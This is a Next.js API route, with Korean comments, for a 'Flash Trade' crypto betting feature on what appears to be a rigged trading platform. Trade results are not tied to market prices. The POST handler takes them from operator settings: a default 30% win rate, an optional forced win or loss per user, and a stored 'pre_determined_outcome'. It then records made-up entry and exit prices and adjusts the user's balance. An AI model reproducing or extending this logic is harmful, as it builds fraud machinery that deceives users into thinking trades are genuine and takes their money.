import { NextRequest } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import { AdminTradeSettings } from '@/lib/simplified-trade-logic';
import { createSuccessResponse, createAuthErrorResponse, createErrorResponse, createValidationErrorResponse } from '@/lib/api-response';
import { createOptionsResponse } from '@/lib/cors';
import { verifyToken } from '@/lib/auth';
import { findUserById } from '@/lib/userStore';

// Flash Trade 거래 생성
export async function POST(request: NextRequest) {
  console.log('🎯 Flash Trade creation request');
  
  try {
    // JWT 토큰 검증
    const authHeader = request.headers.get('authorization');
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return createAuthErrorResponse('인증 토큰이 필요합니다.');
    }

    const token = authHeader.substring(7);
    const decoded = verifyToken(token);
    
    if (!decoded) {
      return createAuthErrorResponse('유효하지 않은 토큰입니다.');
    }

    const body = await request.json();
    const { direction, amount } = body;

    // 입력 검증
    if (!direction || !['up', 'down'].includes(direction)) {
      return createValidationErrorResponse('방향은 "up" 또는 "down"이어야 합니다.');
    }

    if (!amount || typeof amount !== 'number' || amount < 10 || amount > 1000) {
      return createValidationErrorResponse('거래 금액은 10-1000 사이여야 합니다.');
    }

    const userId = (decoded as any).userId;
    console.log(`💰 Creating flash trade for user ${userId}: ${direction} $${amount}`);

    // 사용자 정보 조회
    const user = await findUserById(userId);

    if (!user) {
      return createErrorResponse('사용자 정보를 찾을 수 없습니다.');
    }

    const userBalance = Number(user.balance) || 0;
    if (userBalance < amount) {
      return createErrorResponse('잔액이 부족합니다.');
    }

    // 관리자 설정 조회 (사용자별 설정 우선, 없으면 기본 설정)
    const { data: userSettings } = await supabaseAdmin
      .from('admin_settings')
      .select('*')
      .or(`user_id.eq.${userId},user_id.is.null`)
      .order('user_id', { ascending: false })
      .limit(1)
      .single();

    const settings = userSettings || {
      win_rate: 30.00,
      max_profit_rate: 85.00,
      force_result: null
    };

    // 관리자 설정에 따라 거래 결과 결정
    const tradeConfig = {
      direction,
      amount,
      duration: 60,
      asset: 'BTC'
    };

    const tradeSettings: {
      winRate: number;
      maxProfit: number;
      forceResult?: 'win' | 'lose';
    } = {
      winRate: settings.win_rate,
      maxProfit: settings.max_profit_rate
    };

    if (settings.force_result === 'win' || settings.force_result === 'lose') {
      tradeSettings.forceResult = settings.force_result;
    }

    console.log(`⚙️ Applying admin settings:`, tradeSettings);

    // 이미 구현된 로직 사용
    const result = AdminTradeSettings.applyUserSettings(
      userId,
      tradeConfig,
      tradeSettings
    );

    console.log(`📊 Trade result:`, result);

    // 잔액 업데이트
    const newBalance = userBalance + result.profit;
    const { error: balanceError } = await supabaseAdmin
      .from('users')
      .update({ balance: newBalance })
      .eq('id', userId);

    if (balanceError) {
      console.error('Balance update error:', balanceError);
      return createErrorResponse('잔액 업데이트 중 오류가 발생했습니다.');
    }

    // Flash Trade 기록 저장
    const { data: tradeData, error: tradeError } = await supabaseAdmin
      .from('flash_trades')
      .insert({
        user_id: userId,
        amount,
        direction,
        duration: 60,
        return_rate: settings.max_profit_rate,
        entry_price: 50000, // 임시 가격
        exit_price: result.result === 'win' ? 50100 : 49900,
        potential_profit: Math.abs(result.profit),
        status: result.result === 'win' ? 'win' : 'lose',
        pre_determined_outcome: result.result === 'win' ? 'win' : 'lose'
      })
      .select()
      .single();

    if (tradeError) {
      console.error('Trade save error:', tradeError);
      return createErrorResponse('거래 기록 저장 중 오류가 발생했습니다.');
    }

    console.log(`✅ Flash trade completed successfully. New balance: $${newBalance}`);

    // WebSocket으로 실시간 결과 전송
    try {
      const wsPort = process.env.WEBSOCKET_PORT || '8082';
      const httpPort = parseInt(wsPort) + 1;
      
              // 사용자에게 결과 전송
        fetch(`http://localhost:${httpPort}/notify-trade-result`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: userId,
            result: {
              ...result,
              newBalance,
              timestamp: new Date().toISOString()
            }
          })
        }).catch(err => console.log('⚠️ User notification failed:', err));

        // 관리자에게 거래 활동 알림
        fetch(`http://localhost:${httpPort}/notify-admin-activity`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userId: userId,
            userEmail: (decoded as any).email,
            direction,
            amount,
            result: result.result,
            profit: result.profit,
            timestamp: new Date().toISOString()
          })
        }).catch(err => console.log('⚠️ Admin notification failed:', err));
      
    } catch (wsError) {
      console.log('⚠️ WebSocket notification failed:', wsError);
      // WebSocket 오류는 거래 자체에 영향을 주지 않음
    }

    return createSuccessResponse({
      message: '거래가 완료되었습니다',
      trade: {
        id: tradeData?.id || result.tradeId || Date.now(),
        direction,
        amount,
        duration: 60,
        result: result.result,
        profit: result.profit,
        newBalance,
        timestamp: new Date().toISOString()
      }
    });

  } catch (error) {
    console.error('Flash trade creation error:', error);
    return createErrorResponse('거래 처리 중 오류가 발생했습니다.');
  }
}

// Flash Trade 거래 내역 조회
export async function GET(request: NextRequest) {
  console.log('📊 Flash Trade history request');
  
  try {
    // JWT 토큰 검증
    const authHeader = request.headers.get('authorization');
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return createAuthErrorResponse('인증 토큰이 필요합니다.');
    }

    const token = authHeader.substring(7);
    const decoded = verifyToken(token);
    
    if (!decoded) {
      return createAuthErrorResponse('유효하지 않은 토큰입니다.');
    }

    const userId = (decoded as any).userId;
    
    // URL 파라미터에서 limit 가져오기
    const url = new URL(request.url);
    const limit = parseInt(url.searchParams.get('limit') || '50');

    console.log(`📈 Fetching trade history for user ${userId}, limit: ${limit}`);

    // 거래 내역 조회
    const { data: trades, error } = await supabaseAdmin
      .from('flash_trades')
      .select('*')
      .eq('user_id', userId)
      .order('created_at', { ascending: false })
      .limit(limit);

    if (error) {
      console.error('Trade history fetch error:', error);
      return createErrorResponse('거래 내역 조회 중 오류가 발생했습니다.');
    }

    return createSuccessResponse({
      message: '거래 내역 조회 성공',
      trades: (trades || []).map((trade: any) => ({
        id: trade.id,
        direction: trade.direction,
        amount: parseFloat(trade.amount.toString()),
        result: trade.status, // status 필드 사용
        profit: trade.status === 'win' ? parseFloat(trade.potential_profit.toString()) : -parseFloat(trade.amount.toString()),
        createdAt: trade.created_at
      }))
    });

  } catch (error) {
    console.error('Flash trade history error:', error);
    return createErrorResponse('거래 내역 조회 중 오류가 발생했습니다.');
  }
}

export async function OPTIONS(_request: NextRequest) {
  return createOptionsResponse();
} 